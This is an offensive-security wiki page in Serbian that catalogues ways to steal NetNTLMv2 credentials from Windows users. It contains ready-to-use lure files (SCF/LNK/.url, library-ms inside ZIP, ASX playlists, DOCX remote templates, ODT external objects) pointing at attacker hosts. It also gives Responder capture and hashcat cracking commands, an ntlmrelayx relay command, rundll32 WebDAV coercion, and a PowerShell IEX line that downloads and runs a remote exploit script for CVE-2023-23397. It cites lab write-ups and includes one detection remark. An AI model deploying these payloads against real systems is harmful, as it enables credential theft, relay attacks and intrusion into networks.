# Mesta za krađu NTLM kredencijala

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje od [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od preuzimanja Microsoft Word dokumenta sa interneta do izvora ntlm leak-ova: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### SMB share sa dozvolom za upis + UNC mamci koje aktivira Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ako možete **da pišete u share koji korisnici ili zakazani poslovi pregledaju u Explorer-u**, postavite fajlove čiji metapodaci upućuju na vaš UNC (npr. `\\ATTACKER\share`). Prikazivanje fascikle pokreće **implicitnu SMB autentifikaciju** i prosleđuje **NetNTLMv2** vašem listener-u.<sup>[[1]](#references)</sup>

1. **Generišite mamce** (obuhvata SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/itd.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Postavi ih na deljeni resurs sa dozvolom za upis** (u bilo koju fasciklu koju žrtva otvori):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Prisluškivanje i crackovanje**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows može istovremeno da pristupi većem broju datoteka; sve što Explorer prikazuje u pregledu (`BROWSE TO FOLDER`) ne zahteva klikove.

### Windows Media Player plej-liste (.ASX/.WAX)

Ako možete da navedete metu da otvori ili pregleda Windows Media Player plej-listu koju kontrolišete, možete da leak-ujete Net‑NTLMv2 tako što ćete uputiti stavku na UNC putanju. WMP će pokušati da preuzme navedeni medij preko SMB-a i implicitno će se autentifikovati.<sup>[[3]](#references)[[4]](#references)</sup>

Primer payload-a:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Tok prikupljanja i crackovanja:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### NTLM leak iz .library-ms datoteke ugrađene u ZIP (CVE-2025-24071/24055)

Windows Explorer nesigurno obrađuje .library-ms datoteke kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke upućuje na udaljenu UNC putanju (npr. \\attacker\share), samo pregledanje/pokretanje .library-ms datoteke unutar ZIP-a navodi Explorer da pretraži UNC putanju i pošalje NTLM autentifikaciju napadaču. Tako se dobija NetNTLMv2 koji može da se crackuje offline ili potencijalno relay-uje.<sup>[[2]](#references)</sup>

Minimalna .library-ms datoteka koja upućuje na napadačev UNC

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operativni koraci
- Napravite .library-ms fajl pomoću XML-a iznad (podesite svoju IP adresu/hostname).
- Zipujte ga (na Windowsu: Send to → Compressed (zipped) folder) i pošaljite ZIP meti.
- Pokrenite NTLM capture listener i sačekajte da žrtva otvori .library-ms iz ZIP fajla.


### Putanja zvuka podsetnika za Outlook kalendar (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook za Windows obrađivao je prošireno MAPI svojstvo PidLidReminderFileParameter u stavkama kalendara. Ako bi to svojstvo pokazivalo na UNC putanju (npr. \\attacker\share\alert.wav), Outlook bi kontaktirao SMB share kada bi se podsetnik aktivirao, čime bi procureo korisnikov Net-NTLMv2 bez ikakvog klika. Ovo je ispravljeno 14. marta 2023, ali je i dalje veoma relevantno za zastarele/neizmenjene sisteme i za retrospektivnu analizu incidenata.<sup>[[5]](#references)</sup>

Brza eksploatacija pomoću PowerShell-a (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Strana slušaoca:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Napomene
- Žrtva samo treba da ima pokrenut Outlook za Windows kada se aktivira podsetnik.
- leak otkriva Net‑NTLMv2, pogodan za offline cracking ili relay (ne za pass-the-hash).


### NTLM leak bez klika, zasnovan na ikoni .LNK/.URL (CVE‑2025‑50154 – bypass za CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavno istraživanje pokazalo je da je čak i nakon Microsoftove zakrpe iz aprila 2025. za prečice sa UNC ikonama i dalje bilo moguće pokrenuti NTLM autentifikaciju bez klika tako što bi se cilj prečice hostovao na UNC putanji, a ikona ostavila lokalno (bypass zakrpe dobio je oznaku CVE‑2025‑50154). Dovoljno je samo otvoriti fasciklu da bi Explorer preuzeo metapodatke sa udaljenog cilja i poslao NTLM na SMB server napadača.<sup>[[6]](#references)</sup>

Minimalni payload Internet Shortcut-a (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Programiranje payload-a prečice (.lnk) pomoću PowerShell-a:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ideje za isporuku
- Ubacite prečicu u ZIP i navedite žrtvu da ga otvori.
- Postavite prečicu na deljeni resurs sa dozvolom za upis koji će žrtva otvoriti.
- Kombinujte je sa drugim datotekama-mamcima u istoj fascikli kako bi Explorer prikazao njihove preglede.

### No-click .LNK NTLM leak preko putanje ikone ExtraData (CVE‑2026‑25185)

Windows učitava metapodatke `.lnk` datoteke tokom **pregleda/pretpregleda** (renderovanja ikone), a ne samo prilikom izvršavanja. CVE‑2026‑25185 pokazuje putanju obrade u kojoj blokovi **ExtraData** navode shell da razreši putanju ikone i pristupi sistemu datoteka **tokom učitavanja**, čime se šalje odlazni NTLM zahtev ako je putanja udaljena.

Ključni uslovi za aktiviranje (uočeni u `CShellLink::_LoadFromStream`):
- Uključite **DARWIN_PROPS** (`0xa0000006`) u ExtraData (uslov za pozivanje rutine za ažuriranje ikone).
- Uključite **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) sa popunjenim poljem **TargetUnicode**.
- Učitavač proširuje promenljive okruženja u `TargetUnicode` i poziva `PathFileExistsW` za dobijenu putanju.

Ako se `TargetUnicode` razreši u UNC putanju (npr. `\\attacker\share\icon.ico`), **samo pregled fascikle** koja sadrži prečicu izaziva odlaznu autentifikaciju. Do iste putanje učitavanja mogu doći i **indeksiranje** i **AV skeniranje**, što ovo čini praktičnom површином за leak без клика.<sup>[[7]](#references)</sup>

Alati za istraživanje (parser/generator/UI) dostupni su u projektu **LnkMeMaybe** za pravljenje/pregled ovih struktura bez korišćenja Windows GUI-ja.<sup>[[8]](#references)</sup>


### Принуда WebDAV аутентификације / провера акредитива преко `davclnt.dll,DavSetCookie`

Уграђени **WebDAV клијент** може се злоупотребити да би се тренутна сесија за пријаву натерала да се аутентификује на произвољној **HTTP/WebDAV** крајњој тачки:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Zašto je ovo korisno:
- U slučaju **WebDAV servera kojim upravlja napadač**, može da pokrene **NTLM preko HTTP-a** bez ubacivanja custom client-a.
- U slučaju **internih hostova**, ovo je nenametljiv način da **proverite gde se prihvataju ukradeni akreditivi** pre lateralnog kretanja.<sup>[[9]](#references)</sup>
- Komanda je dobra alternativa kada je **SMB egress filtriran**, ali je **HTTP/WebDAV** i dalje dostupan.

Operativne napomene:
- Usluga **WebClient** mora da bude pokrenuta na izvornom hostu.
- `rundll32.exe` učitava `davclnt.dll` i prepušta Windows-u da obavi WebDAV autentifikaciju koristeći **akreditive trenutnog korisnika**.<sup>[[10]](#references)</sup>
- Ako je usmerite ka infrastrukturi koju kontrolišete, koristite HTTP listener/relay koji podržava NTLM, kao što je:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Iz perspektive detekcije, ponovljena pokretanja `rundll32.exe davclnt.dll,DavSetCookie` usmerena na mnoge interne sisteme snažan su signal **provere akreditiva / pripreme za lateralno kretanje nalik password spray napadu**, a ne uobičajenog ponašanja korisnika.<sup>[[9]](#references)[[11]](#references)</sup>

### Office ubacivanje udaljenog predloška (.docx/.dotm) radi iznuđivanja NTLM autentifikacije

Office dokumenti mogu da referenciraju spoljašnji predložak. Ako priloženi predložak postavite na UNC putanju, prilikom otvaranja dokumenta obaviće se autentifikacija preko SMB-a.

Minimalne izmene DOCX relacija (unutar word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi predložak:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Uredite word/_rels/settings.xml.rels i usmerite rId1337 na svoj UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Ponovo upakujte u .docx i isporučite. Pokrenite SMB listener za hvatanje i sačekajte da se dokument otvori.

### Spoljni objekat u ODT-u za SMB autentifikaciju

Kada putanja za otpremanje dokumenata prihvata `.odt`, ali cilj ne otvara Office `.docx` datoteke, umesto Office predloška upotrebite OpenDocument spoljni objekat. Metasploitov `auxiliary/fileformat/odt_badodt` generiše ODT čiji `content.xml` sadrži `draw:object` referencu koja se aktivira pri otvaranju, poput one ispod. Podesite `LHOST` na SMB listener, otpremite ODT kroz dozvoljeni tok rada i uhvatite odlazni NetNTLMv2 odgovor kada ga korisnik ili procesor dokumenata otvori. Provera ekstenzije datoteke ne proverava ugrađeni URL; ograničenja dolaznog NTLM-a na cilju ne moraju nužno sprečiti odlaznu autentifikaciju.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Za ideje nakon capture-a za relay ili zloupotrebu NTLM-a, pogledajte:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Mamci preko deljenog direktorijuma sa dozvolom za upis + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM ranjivosti: Nezakrpljene pretnje eskalacije privilegija u Microsoftu](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft ublažava Outlook EoP (CVE‑2023‑23397) i objašnjava NTLM leak preko PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, jedan NTLM: Zaobilaženje Microsoft bezbednosne zakrpe (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Pregled CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe alati](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Kada pozove IT podrška: Analiza ModeloRAT kampanje od Teams-a do kompromitovanja domena](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – datoteka zaglavlja davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV zahtev](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Zanimljiva mesta za krađu NetNTLM hash-eva](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — Hvatanje NTLM-a preko eksternog objekta u ODT-u](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
